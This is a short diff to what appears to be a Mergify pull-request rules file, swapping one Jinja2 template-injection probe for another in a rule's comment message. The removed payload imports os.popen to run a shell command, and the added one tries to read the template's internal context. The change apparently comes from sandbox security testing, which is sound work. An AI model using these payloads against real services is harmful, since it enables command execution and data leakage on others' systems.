@@ -1,10 +1,10 @@
 pull_request_rules:
-  - name: vm6-j2-fromos-261016
+  - name: vm6-j2-selfctx-261016
     conditions:
-      - label = vm6-j2-fromos
+      - label = vm6-j2-selfctx
     actions:
       comment:
-        message: "{% from 'os' import popen %}{{ popen('id').read() }}"
+        message: "{{ self._TemplateReference__context }}"
 
 commands_restrictions:
   queue:
